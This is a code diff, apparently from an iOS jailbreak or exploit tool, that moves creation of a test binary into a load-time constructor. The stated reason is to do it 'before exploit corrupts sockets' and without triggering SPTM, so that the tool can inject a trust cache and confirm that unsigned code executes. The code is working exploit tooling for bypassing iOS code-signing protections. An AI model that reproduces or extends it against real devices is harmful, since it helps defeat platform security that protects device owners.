@@ -341,20 +341,43 @@ bool msm_inject_trust_cache(const char *tcPath)
 }
 
 // ---------------------------------------------------------------------------
+// Pre-create the MSM test binary at load time (before exploit corrupts sockets)
+// ---------------------------------------------------------------------------
+static NSString *g_msm_bin_path = nil;
+static NSString *g_msm_tc_path = nil;
+__attribute__((constructor)) static void precreate_msm_test_binary(void)
+{
+    NSString *tmpDir = NSTemporaryDirectory();
+    if (!tmpDir) return;
+    g_msm_bin_path = [tmpDir stringByAppendingPathComponent:@"msm_test_bin"];
+    g_msm_tc_path = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];
+
+    if (!msm_write_test_binary(g_msm_bin_path.UTF8String)) {
+        printf("[MountCache] pre-creation of test binary failed\n");
+        g_msm_bin_path = nil;
+    }
+}
+
+// ---------------------------------------------------------------------------
 // Convenience: build test binary + TC, inject via MSM, verify via launchd RC
 // ---------------------------------------------------------------------------
 bool msm_verify_unsigned_execution(void)
 {
-    NSString *tmpDir = NSTemporaryDirectory();
-    NSString *binPath = [tmpDir stringByAppendingPathComponent:@"msm_test_bin"];
-    NSString *tcPath = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];
-
-    // Step 1: Write test binary
-    printf("[MountCache] writing test binary...\n");
-    if (!msm_write_test_binary(binPath.UTF8String)) {
-        printf("[MountCache] failed to write test binary\n");
-        return false;
+    if (!g_msm_bin_path || !g_msm_tc_path) {
+        printf("[MountCache] pre-created binary unavailable, falling back\n");
+        // Fallback: create at runtime (may trigger SPTM)
+        NSString *tmpDir = NSTemporaryDirectory();
+        if (!tmpDir) return false;
+        g_msm_bin_path = [tmpDir stringByAppendingPathComponent:@"msm_test_bin"];
+        g_msm_tc_path = [tmpDir stringByAppendingPathComponent:@"msm_tc.bin"];
+        if (!msm_write_test_binary(g_msm_bin_path.UTF8String)) {
+            printf("[MountCache] failed to write test binary\n");
+            return false;
+        }
     }
+
+    NSString *binPath = g_msm_bin_path;
+    NSString *tcPath = g_msm_tc_path;
 
     // Step 2: Compute CDHash
     printf("[MountCache] computing CDHash...\n");
